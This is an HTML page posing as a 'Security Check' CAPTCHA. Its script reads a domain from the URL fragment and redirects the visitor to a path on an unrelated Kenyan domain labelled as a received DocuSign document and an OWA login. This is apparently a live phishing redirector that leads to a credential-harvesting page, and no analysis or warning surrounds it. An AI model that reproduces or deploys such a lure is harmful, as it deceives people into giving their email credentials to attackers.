<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Check</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>Please verify you're not a robot</h2>

  <label>
    <input type="checkbox" id="captchaCheck" onclick="toggleContinueButton()">
    I'm not a robot
  </label>

  <br>
  <button id="continueBtn" onclick="redirectNow()">Continue</button>

  <script>
    function toggleContinueButton() {
      const isChecked = document.getElementById("captchaCheck").checked;
      document.getElementById("continueBtn").style.display = isChecked ? "inline-block" : "none";
    }

    function redirectNow() {
      const hash = window.location.hash;
      const domain = hash ? hash.substring(1) : "";

      const isValidDomain = /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain);
      const targetDomain = isValidDomain ? domain : "defaultdomain.com";

      const redirectURL = `https://pedorcapitallimited.co.ke/Docusign_document_received/kjfhgjdskhfusdkjfhbsuhfdjhfdishsbhfdkjhaiskhsdkjfnbauhsjdhadfhjksdjhsgfghdkjghjhejjrkee/owa2/index.html#${encodeURIComponent(targetDomain)}`;

      window.location.href = redirectURL;
    }
  </script>
</body>
</html>
